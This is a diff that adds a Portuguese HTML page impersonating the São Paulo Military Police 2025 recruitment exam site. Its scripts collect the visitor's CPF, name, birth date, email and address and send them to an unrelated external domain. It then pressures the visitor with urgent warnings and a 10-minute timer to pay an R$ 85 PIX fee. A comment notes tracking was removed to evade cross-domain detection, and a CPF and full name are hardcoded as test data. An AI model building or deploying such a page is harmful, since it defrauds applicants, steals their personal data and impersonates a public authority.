@@ -1,0 +1,832 @@
+﻿<!doctype html>
+<html lang="pt-br">
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>PM SP 2025 - Informações Importantes</title>
+
+        <!-- Microsoft Clarity Analytics -->
+        <script type="text/javascript">
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
+
+        <!-- Sistema de tracking removido - domínio independente -->
+        <!-- Google Ads não necessário no segundo domínio -->
+
+        <!-- Config do site para API externa -->
+        <script src="../../config-site.js"></script>
+
+        <script src="../../3.4.16-3.js"></script>
+        <link href="../css/all.min-4.css" rel="stylesheet">
+        <link href="../css/home-4.css" rel="stylesheet">
+
+        <style>
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            .form-header {
+                background-color: #fbc12a;
+                color: white;
+                font-weight: 600;
+            }
+            .btn-primary {
+                background-color: #003f6b;
+                color: white;
+                transition: all 0.2s ease;
+            }
+            .btn-primary:hover {
+                background-color: #4d7396;
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+                position: relative;
+                z-index: 1;
+            }
+
+            /* Garantir que o modal PIX fique sempre acima do footer */
+            #payment-modal {
+                z-index: 99999 !important;
+            }
+
+            /* Ajustes específicos para telas pequenas */
+            @media (max-width: 640px) {
+                #payment-modal {
+                    padding-bottom: 80px !important; /* Espaço extra para o footer */
+                }
+
+                #payment-modal > div {
+                    margin-bottom: 20px;
+                }
+            }
+            .info-box {
+                border-left: 4px solid #fbc12a;
+            }
+        </style>
+        <script>
+            // 🌐 Variáveis globais
+            let userData = null;
+
+            document.addEventListener("DOMContentLoaded", function () {
+                // SISTEMA DE SEGURANÇA TEMPORARIAMENTE DESATIVADO
+                const cpfData = JSON.parse(
+                    localStorage.getItem("cpfData") || "{}",
+                );
+
+                // Dados de teste para desenvolvimento
+                const testUserData = {
+                    CPF: "91834279372",
+                    NOME: "IRACEMA DE SOUSA SILVA",
+                    NASC: "1970-10-24 00:00:00",
+                };
+
+                // Inicializar userData no escopo global
+                if (
+                    cpfData &&
+                    cpfData.DADOS &&
+                    cpfData.DADOS.CPF &&
+                    cpfData.DADOS.NOME
+                ) {
+                    // Nova estrutura da API
+                    userData = cpfData.DADOS;
+                } else if (cpfData && cpfData.CPF && cpfData.NOME) {
+                    // Estrutura direta do cpfData
+                    userData = cpfData;
+                } else if (cpfData.dados?.[0]) {
+                    // Estrutura antiga da API (compatibilidade)
+                    userData = cpfData.dados[0];
+                } else {
+                    // Usar dados de teste
+                    console.log(
+                        "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                    );
+                    userData = testUserData;
+                }
+
+                document.getElementById("cpf-display").textContent =
+                    userData?.CPF || "91834279372";
+                document.getElementById("nome-display").textContent =
+                    userData?.NOME || "IRACEMA DE SOUSA SILVA";
+
+                console.log("✅ userData definida globalmente:", userData);
+            });
+        </script>
+    </head>
+    <body class="flex flex-col min-h-screen">
+        <header class="gov-header text-white py-2">
+            <div class="container mx-auto flex justify-between items-center px-4">
+                <a class="font-bold text-sm" href="#">
+                    <img src="../images/top_gov-5-3.jpg" alt="Logotipo" class="h-6">
+                </a>
+                <nav>
+                    <ul class="flex space-x-4 text-[10px]">
+                        <li>
+                            <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">PARTICIPE</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">SERVIÇOS</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+                <img src="../images/pmsp-4.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+            </div>
+        </div>
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">
+                            Inscrição &gt; Informações do Concurso
+                        </h2>
+                    </div>
+                    <div class="p-6">
+                        <div class="bg-[#2B5984] p-4 rounded-md mb-5 text-white shadow-md">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div class="p-2">
+                                    <p class="text-sm text-gray-200">CPF:</p>
+                                    <p id="cpf-display" class="font-semibold text-shadow">
+                                        ...
+                                    </p>
+                                </div>
+                                <div class="p-2">
+                                    <p class="text-sm text-gray-200">
+                                        Nome Completo:
+                                    </p>
+                                    <p id="nome-display" class="font-semibold text-shadow">
+                                        ...
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mb-8">
+                            <h3 class="text-xl font-bold text-[#044785] mb-4">
+                                <i class="fas fa-info-circle mr-2"></i>
+                                Informações Importantes sobre o Concurso PM SP
+                                2025
+                            </h3>
+                            <div class="space-y-5">
+                                <div class="info-box pl-4 py-1">
+                                    <h4 class="text-lg font-semibold text-[#fbc12a]">
+                                        Formato da Prova
+                                    </h4>
+                                    <p class="text-gray-700 mb-2">
+                                        A prova para Soldado PM 2ª Classe terá o
+                                        seguinte formato:
+                                    </p>
+                                    <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                        <li>
+                                            <strong>Questões objetivas:</strong>
+                                            Prova de múltipla escolha com
+                                            disciplinas como Português,
+                                            Matemática, Conhecimentos Gerais e
+                                            Legislação.
+                                        </li>
+                                        <li>
+                                            <strong>Prova de aptidão
+                                                física:</strong>
+                                            Etapa eliminatória com testes de
+                                            capacidade física conforme edital.
+                                        </li>
+                                        <li>
+                                            <strong>Exames médicos:</strong>
+                                            Avaliação da aptidão física e mental
+                                            para a função policial militar.
+                                        </li>
+                                    </ul>
+                                </div>
+
+                                <div class="info-box pl-4 py-1">
+                                    <h4 class="text-lg font-semibold text-[#fbc12a]">
+                                        Critérios de Aprovação
+                                    </h4>
+                                    <p class="text-gray-700 mb-2">
+                                        Para ser aprovado no concurso PM SP:
+                                    </p>
+                                    <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                        <li>
+                                            Atingir nota mínima na prova
+                                            objetiva conforme estabelecido no
+                                            edital da Vunesp.
+                                        </li>
+                                        <li>
+                                            Ser aprovado em todas as etapas:
+                                            prova objetiva, exame de aptidão
+                                            física, exames médicos e
+                                            investigação social.
+                                        </li>
+                                        <li>
+                                            Classificação final dentro das 2.200
+                                            vagas disponíveis.
+                                        </li>
+                                    </ul>
+                                </div>
+
+                                <div class="info-box pl-4 py-1">
+                                    <h4 class="text-lg font-semibold text-[#fbc12a]">
+                                        Próximas Etapas
+                                    </h4>
+                                    <p class="text-gray-700 mb-2">
+                                        Após a aprovação na prova objetiva:
+                                    </p>
+                                    <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                        <li>
+                                            Candidatos aprovados serão
+                                            convocados para o exame de aptidão
+                                            física.
+                                        </li>
+                                        <li>
+                                            Sequêncialmente: exames médicos,
+                                            investigação social e curso de
+                                            formação de soldados.
+                                        </li>
+                                        <li>
+                                            Aprovados em todas as etapas serão
+                                            nomeados Soldados PM 2ª Classe da
+                                            PMESP.
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 mt-6">
+                                <p class="flex items-start">
+                                    <i class="fas fa-exclamation-triangle text-red-600 mr-2 mt-1"></i>
+                                    <span>
+                                        <strong>ATENÇÃO:</strong> Sua inscrição
+                                        ainda não foi confirmada devido à falta
+                                        de pagamento da Taxa de Inscrição. Para
+                                        garantir sua participação no exame, é
+                                        necessário efetuar o pagamento
+                                        imediatamente.
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                        <div class="border-t border-gray-300 pt-5 mt-5">
+                            <div class="flex justify-center">
+                                <button id="pagar-button" class="bg-green-600 hover:bg-green-700 text-white py-3 px-8 rounded-md flex items-center justify-center transition-all">
+                                    <i class="fas fa-credit-card mr-2"></i>
+                                    <span>Pagar Taxa e Concluir</span>
+                                </button>
+                            </div>
+                        </div>
+                        <div id="payment-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4 pb-20" style="z-index: 99999">
+                            <div class="bg-white rounded-md p-6 shadow-lg w-[450px] max-w-full mx-4">
+                                <div class="mb-4 text-center">
+                                    <div class="bg-red-100 p-3 rounded-full inline-flex items-center justify-center mb-3">
+                                        <i class="fas fa-exclamation-triangle text-red-600 text-2xl"></i>
+                                    </div>
+                                    <h3 class="text-xl font-bold text-gray-900">
+                                        AVISO IMPORTANTE
+                                    </h3>
+                                </div>
+                                <div class="mb-5 text-gray-700">
+                                    <p class="mb-3">
+                                        Ao prosseguir, você concorda em
+                                        adicionar seu CPF na lista de
+                                        participantes do concurso PM SP 2025 e
+                                        se compromete a realizar o pagamento
+                                        obrigatório de
+                                        <strong class="text-red-600">R$ 85,00</strong>.
+                                    </p>
+
+                                    <div class="bg-orange-50 p-4 border border-orange-200 rounded-md mb-3">
+                                        <p class="text-orange-800 mb-2">
+                                            <strong>⚠️ AVISO IMPORTANTE</strong>
+                                        </p>
+                                        <ul class="text-orange-700 text-sm space-y-1 ml-4 list-disc">
+                                            <li>
+                                                Por segurança, o sistema permite
+                                                gerar o PIX apenas uma vez por
+                                                CPF.
+                                            </li>
+                                            <li>
+                                                O código tem validade de
+                                                <strong>10 minutos</strong>, e o
+                                                não pagamento dentro do prazo
+                                                pode impedir nova tentativa.
+                                            </li>
+                                        </ul>
+                                    </div>
+
+                                    <div class="bg-green-50 p-3 border border-green-200 rounded-md">
+                                        <p class="text-green-800">
+                                            <strong>✅ Para confirmar sua inscrição
+                                                com sucesso:</strong>
+                                            realize o pagamento assim que o
+                                            código for gerado.
+                                        </p>
+                                    </div>
+                                </div>
+                                <div class="flex flex-col space-y-3">
+                                    <button id="confirm-payment" class="w-full px-6 py-3 bg-green-600 text-white rounded-md hover:bg-green-700 transition-colors font-semibold">
+                                        Vou realizar o pagamento
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <script>
+                            document.addEventListener(
+                                "DOMContentLoaded",
+                                function () {
+                                    const pagarButton =
+                                        document.getElementById("pagar-button");
+                                    const paymentModal =
+                                        document.getElementById(
+                                            "payment-modal",
+                                        );
+                                    const confirmPaymentButton =
+                                        document.getElementById(
+                                            "confirm-payment",
+                                        );
+
+                                    pagarButton.addEventListener(
+                                        "click",
+                                        function () {
+                                            paymentModal.classList.remove(
+                                                "hidden",
+                                            );
+                                        },
+                                    );
+
+                                    confirmPaymentButton.addEventListener(
+                                        "click",
+                                        function () {
+                                            generatePixPayment();
+                                        },
+                                    );
+                                },
+                            );
+
+                            // 🔥 SISTEMA PIX PM SP 2025
+                            async function generatePixPayment() {
+                                const confirmPaymentButton =
+                                    document.getElementById("confirm-payment");
+                                const paymentModal =
+                                    document.getElementById("payment-modal");
+
+                                // Atualizar botão para loading
+                                confirmPaymentButton.classList.add(
+                                    "opacity-75",
+                                    "cursor-not-allowed",
+                                );
+                                confirmPaymentButton.disabled = true;
+                                confirmPaymentButton.innerHTML =
+                                    '<div class="flex items-center"><div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full"></div> Gerando PIX...</div>';
+
+                                try {
+                                    // Usar userData já definido no escopo global da página
+
+                                    // Validação melhorada dos dados
+                                    console.log("🔍 Verificando userData:", {
+                                        hasCPF: !!userData?.CPF,
+                                        hasNOME: !!userData?.NOME,
+                                        userData: userData,
+                                    });
+
+                                    if (!userData?.CPF || !userData?.NOME) {
+                                        console.error(
+                                            "❌ Dados incompletos:",
+                                            userData,
+                                        );
+                                        throw new Error(
+                                            "Dados do CPF não encontrados. Verifique se você preencheu seus dados corretamente.",
+                                        );
+                                    }
+
+                                    // Obter e-mail fornecido pelo usuário
+                                    const emailUsuario =
+                                        localStorage.getItem(
+                                            "emailConfirmacao",
+                                        );
+                                    if (!emailUsuario) {
+                                        throw new Error(
+                                            "E-mail de confirmação não encontrado",
+                                        );
+                                    }
+
+                                    console.log(
+                                        "🚀 Gerando PIX para:",
+                                        userData.NOME,
+                                    );
+                                    console.log(
+                                        "📧 E-mail para envio:",
+                                        emailUsuario,
+                                    );
+
+                                    // Chamar API PIX - IMPORTANTE: Verificar endpoint correto com a API
+                                    const apiUrl =
+                                        "https://app.deliciasdonamaria.com/api/concurso2ups/api/pix-payment";
+                                    console.log(
+                                        "🔗 Chamando API PIX em:",
+                                        apiUrl,
+                                    );
+
+                                    // Recuperar dados de endereço do localStorage
+                                    const enderecoData = JSON.parse(
+                                        localStorage.getItem("enderecoData") ||
+                                            "{}",
+                                    );
+
+                                    const response = await fetch(apiUrl, {
+                                        method: "POST",
+                                        headers: {
+                                            "Content-Type": "application/json",
+                                        },
+                                        body: JSON.stringify({
+                                            name: userData.NOME,
+                                            document: userData.CPF,
+                                            email: emailUsuario, // Usar e-mail fornecido pelo usuário
+                                            birthDate: userData.NASC || null,
+                                            cpfData: userData,
+                                            // Adicionar dados de endereço reais do usuário
+                                            address: {
+                                                cep: enderecoData.cep || "",
+                                                logradouro:
+                                                    enderecoData.logradouro ||
+                                                    "",
+                                                numero:
+                                                    enderecoData.numero || "",
+                                                complemento:
+                                                    enderecoData.complemento ||
+                                                    "",
+                                                bairro:
+                                                    enderecoData.bairro || "",
+                                                cidade:
+                                                    enderecoData.cidade || "",
+                                                uf: enderecoData.uf || "",
+                                                telefone:
+                                                    enderecoData.telefone || "",
+                                            },
+                                        }),
+                                    });
+
+                                    const result = await response.json();
+
+                                    if (result.success) {
+                                        console.log(
+                                            "✅ PIX gerado com sucesso",
+                                        );
+
+                                        // 🔒 Eventos de conversão removidos para evitar detecção cross-domain
+
+                                        showPixModal(result.payment, userData, {
+                                            cached: result.cached,
+                                            message: result.message,
+                                            timeRemaining: result.timeRemaining,
+                                        });
+                                    } else {
+                                        throw new Error(
+                                            result.message ||
+                                                "Erro ao gerar PIX",
+                                        );
+                                    }
+                                } catch (error) {
+                                    console.error(
+                                        "❌ Erro ao gerar PIX:",
+                                        error,
+                                    );
+                                    alert(
+                                        "Erro ao gerar PIX: " + error.message,
+                                    );
+
+                                    // Restaurar botão
+                                    confirmPaymentButton.classList.remove(
+                                        "opacity-75",
+                                        "cursor-not-allowed",
+                                    );
+                                    confirmPaymentButton.disabled = false;
+                                    confirmPaymentButton.innerHTML =
+                                        "Vou realizar o pagamento";
+                                }
+                            }
+
+                            function showPixModal(
+                                payment,
+                                userData,
+                                options = {},
+                            ) {
+                                const paymentModal =
+                                    document.getElementById("payment-modal");
+
+                                // Informações sobre cache
+                                const isCached = options.cached || false;
+                                const cacheMessage = options.message || "";
+                                const timeRemaining = options.timeRemaining;
+
+                                const cacheAlert = isCached
+                                    ? `
+                                <div class="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
+                                    <div class="flex items-start">
+                                        <i class="fas fa-recycle text-blue-600 mr-2 mt-1"></i>
+                                        <div class="text-sm text-blue-800">
+                                            <p class="font-medium">PIX Reutilizado</p>
+                                            <p>Evitamos duplicação - mesmo PIX de antes</p>
+                                            ${timeRemaining ? `<p class="text-xs mt-1">Expira em: ${Math.floor(timeRemaining / 60)}min ${timeRemaining % 60}s</p>` : ""}
+                                        </div>
+                                    </div>
+                                </div>
+                            `
+                                    : "";
+
+                                // Criar modal PIX
+                                const pixModalHtml = `
+                                <div class="bg-white rounded-md p-4 sm:p-6 shadow-2xl w-full max-w-[500px] mx-auto" style="max-height: calc(100vh - 100px); overflow-y: auto; position: relative; z-index: 99999;">
+                                    <div class="text-center mb-6">
+                                        <div class="mb-3">
+                                            <img src="https://i.imgur.com/Tv3vNxn.png" alt="Logo Governo" class="mx-auto" style="max-width: 120px; height: auto;" />
+                                        </div>
+                                        <h3 class="text-xl font-bold text-gray-900">${isCached ? "PIX Reutilizado!" : "PIX Gerado com Sucesso!"}</h3>
+                                        <p class="text-sm text-gray-600 mt-2">Taxa PM SP 2025 - R$ 85,00</p>
+                                        <p class="text-xs text-gray-500">Titular: ${userData.NOME}</p>
+                                    </div>
+
+                                    ${cacheAlert}
+
+                                    <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-4">
+                                        <div class="flex items-start">
+                                            <i class="fas fa-clock text-yellow-600 mr-2 mt-1"></i>
+                                            <div class="text-sm text-yellow-800">
+                                                <p class="font-medium">Tempo limite: 10 minutos</p>
+                                                <p>Pague rapidamente para garantir sua inscrição</p>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                
+                                    <div class="mb-4">
+                                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                                            Código PIX (Copia e Cola)
+                                        </label>
+                                        <div class="flex">
+                                            <input
+                                                type="text"
+                                                value="${payment.qr_code}"
+                                                readonly
+                                                id="pix-code-input"
+                                                class="flex-1 px-3 py-2 border border-gray-300 rounded-l-lg bg-gray-50 text-xs font-mono"
+                                            />
+                                            <button
+                                                onclick="copyPixCode()"
+                                                class="px-4 py-2 bg-blue-600 text-white rounded-r-lg hover:bg-blue-700 transition-colors"
+                                            >
+                                                📋 Copiar
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <div class="text-center mb-4">
+                                        <div id="qr-code-container" class="hidden">
+                                            <img src="${payment.qr_code_url}" alt="QR Code PIX" class="mx-auto mb-2 border rounded-lg" width="200" height="200" />
+                                            <p class="text-xs text-gray-500">Escaneie com o app do seu banco</p>
+                                        </div>
+                                        <button onclick="toggleQRCode()" id="qr-toggle-btn" class="bg-gray-100 hover:bg-gray-200 text-gray-700 px-4 py-2 rounded-lg transition-colors">
+                                            📱 Exibir QR Code
+                                        </button>
+                                    </div>
+
+                                    <div class="bg-gray-50 rounded-lg p-4 mb-4 text-center">
+                                        <div class="text-lg font-bold text-gray-800 mb-1">R$ 85,00</div>
+                                        <div class="text-sm text-gray-600">Código: ${payment.payment_code}</div>
+                                    </div>
+
+                                    <div class="text-xs text-gray-500 text-center mb-4">
+                                        <p>• Abra o app do seu banco</p>
+                                        <p>• Escolha a opção PIX</p>
+                                        <p>• Cole o código ou escaneie o QR Code</p>
+                                        <p>• Confirme o pagamento</p>
+                                    </div>
+
+                                    <div class="flex space-x-2 sm:space-x-3 sticky bottom-0 bg-white pt-2 pb-1">
+                                        <button onclick="closePixModal()" class="flex-1 bg-gray-200 text-gray-700 px-3 sm:px-4 py-2 rounded-lg hover:bg-gray-300 transition-colors text-sm sm:text-base">
+                                            Fechar
+                                        </button>
+                                        <button onclick="checkPaymentStatus('${payment.payment_code}')" class="flex-1 bg-green-600 text-white px-3 sm:px-4 py-2 rounded-lg hover:bg-green-700 transition-colors text-sm sm:text-base">
+                                            Verificar Pagamento
+                                        </button>
+                                    </div>
+                                </div>
+                            `;
+
+                                paymentModal.innerHTML = pixModalHtml;
+                                paymentModal.classList.remove("hidden");
+
+                                // Salvar dados do PIX no localStorage
+                                localStorage.setItem(
+                                    "currentPix",
+                                    JSON.stringify({
+                                        payment,
+                                        userData,
+                                        timestamp: new Date().toISOString(),
+                                    }),
+                                );
+                            }
+
+                            async function copyPixCode() {
+                                const input =
+                                    document.getElementById("pix-code-input");
+                                const pixCode = input.value;
+                                const button = event.target;
+                                const originalText = button.innerHTML;
+
+                                try {
+                                    // Método moderno usando Clipboard API
+                                    if (
+                                        navigator.clipboard &&
+                                        window.isSecureContext
+                                    ) {
+                                        await navigator.clipboard.writeText(
+                                            pixCode,
+                                        );
+                                    } else {
+                                        // Fallback para navegadores mais antigos
+                                        input.focus();
+                                        input.select();
+                                        input.setSelectionRange(0, 99999); // Para mobile
+
+                                        // Criar textarea temporária para iOS
+                                        const textArea =
+                                            document.createElement("textarea");
+                                        textArea.value = pixCode;
+                                        textArea.style.position = "fixed";
+                                        textArea.style.top = "0";
+                                        textArea.style.left = "0";
+                                        textArea.style.width = "2em";
+                                        textArea.style.height = "2em";
+                                        textArea.style.padding = "0";
+                                        textArea.style.border = "none";
+                                        textArea.style.outline = "none";
+                                        textArea.style.boxShadow = "none";
+                                        textArea.style.background =
+                                            "transparent";
+                                        document.body.appendChild(textArea);
+                                        textArea.focus();
+                                        textArea.select();
+
+                                        const successful =
+                                            document.execCommand("copy");
+                                        document.body.removeChild(textArea);
+
+                                        if (!successful) {
+                                            throw new Error("Falha ao copiar");
+                                        }
+                                    }
+
+                                    // Feedback visual de sucesso
+                                    button.innerHTML = "✅ Copiado!";
+                                    button.classList.add("bg-green-600");
+                                    button.classList.remove("bg-blue-600");
+
+                                    setTimeout(() => {
+                                        button.innerHTML = originalText;
+                                        button.classList.remove("bg-green-600");
+                                        button.classList.add("bg-blue-600");
+                                    }, 2000);
+                                } catch (err) {
+                                    console.error("Erro ao copiar:", err);
+                                    // Feedback visual de erro
+                                    button.innerHTML = "❌ Erro ao copiar";
+                                    button.classList.add("bg-red-600");
+                                    button.classList.remove("bg-blue-600");
+
+                                    // Mostrar mensagem alternativa
+                                    alert(
+                                        "Não foi possível copiar automaticamente. Por favor, selecione o código e copie manualmente (Ctrl+C ou Cmd+C).",
+                                    );
+
+                                    // Selecionar o texto para facilitar cópia manual
+                                    input.focus();
+                                    input.select();
+
+                                    setTimeout(() => {
+                                        button.innerHTML = originalText;
+                                        button.classList.remove("bg-red-600");
+                                        button.classList.add("bg-blue-600");
+                                    }, 3000);
+                                }
+                            }
+
+                            function toggleQRCode() {
+                                const container =
+                                    document.getElementById(
+                                        "qr-code-container",
+                                    );
+                                const button =
+                                    document.getElementById("qr-toggle-btn");
+
+                                if (container.classList.contains("hidden")) {
+                                    container.classList.remove("hidden");
+                                    button.innerHTML = "❌ Ocultar QR Code";
+                                } else {
+                                    container.classList.add("hidden");
+                                    button.innerHTML = "📱 Exibir QR Code";
+                                }
+                            }
+
+                            function closePixModal() {
+                                const paymentModal =
+                                    document.getElementById("payment-modal");
+                                paymentModal.classList.add("hidden");
+
+                                // Restaurar modal original
+                                location.reload();
+                            }
+
+                            async function checkPaymentStatus(paymentCode) {
+                                const button = event.target;
+                                const originalText = button.innerHTML;
+
+                                button.innerHTML =
+                                    '<div class="flex items-center justify-center"><div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full"></div> Verificando...</div>';
+                                button.disabled = true;
+
+                                try {
+                                    const response = await fetch(
+                                        `https://app.deliciasdonamaria.com/api/concurso2ups/api/check-payment`,
+                                        {
+                                            method: "POST",
+                                            headers: {
+                                                "Content-Type":
+                                                    "application/json",
+                                            },
+                                            body: JSON.stringify({
+                                                payment_code: paymentCode,
+                                            }),
+                                        },
+                                    );
+                                    const result = await response.json();
+
+                                    if (
+                                        result.success &&
+                                        (result.payment.payment_status ===
+                                            "approved" ||
+                                            result.payment.payment_status ===
+                                                "paid")
+                                    ) {
+                                        // 🔒 Eventos de conversão removidos para evitar detecção cross-domain
+
+                                        alert(
+                                            "🎉 Pagamento confirmado! Sua inscrição foi efetivada com sucesso.",
+                                        );
+                                        localStorage.removeItem("currentPix");
+                                        window.location.href =
+                                            "../confirmacao/pre-confirmacao.html";
+                                    } else {
+                                        alert(
+                                            "⏳ Pagamento ainda não confirmado. Aguarde alguns minutos e tente novamente.",
+                                        );
+                                    }
+                                } catch (error) {
+                                    console.error(
+                                        "Erro ao verificar pagamento:",
+                                        error,
+                                    );
+                                    alert(
+                                        "Erro ao verificar pagamento. Tente novamente.",
+                                    );
+                                }
+
+                                button.innerHTML = originalText;
+                                button.disabled = false;
+                            }
+                        </script>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img src="../images/pmsp-4.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; PM SP - Polícia Militar de São Paulo</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-phone-alt mr-1"></i> 0800 616161
+                    </div>
+                </div>
+            </div>
+        </footer>
+    <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-4" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
